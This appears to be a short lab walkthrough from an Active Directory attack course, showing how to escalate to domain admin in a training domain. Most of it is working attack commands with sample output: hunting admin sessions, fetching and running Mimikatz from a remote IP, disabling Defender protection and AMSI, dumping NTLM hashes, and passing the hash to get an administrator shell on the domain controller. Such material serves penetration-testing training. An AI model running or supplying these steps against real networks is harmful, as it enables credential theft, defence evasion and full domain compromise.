
# Privilege escalate to Domain Admin privileges
Using Server where domain admin is logged

1. Check if domain admin is logged in to any machine and if we have localadmin privileges on those machine
```powershell
Invoke-UserHunter -CheckAccess | select UserName, ComputerName, LocalAdmin

#UserName      ComputerName                            LocalAdmin
#--------      ------------                            ----------
#Administrator dcorp-appsrv.dollarcorp.moneycorp.local      False
#svcadmin      dcorp-mgmt.dollarcorp.moneycorp.local         True

```

2. Check if powershell remote port is open
```powershell
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```


3. Dump hashes of domain admin
```
# Load Mimikatz remotely, remember to disable AMSI
iex (iwr http://172.16.100.133/Invoke-Mimikatz.ps1 -UseBasicParsing)

# Create session to target
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local

# disable AV Protection
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess

# Dump hashes
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess

#    * Username : svcadmin
#    * Domain   : dcorp
#    * NTLM     : b38ff50264b74508085d82c69794a4d8
```

4. Get remote shell using NTLM hash of domain admin
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```

5. Verify that we have domain admin 
```powershell
Invoke-Command -ScriptBlock{hostname;whoami;ipconfig} -ComputerName dcorp-dc
```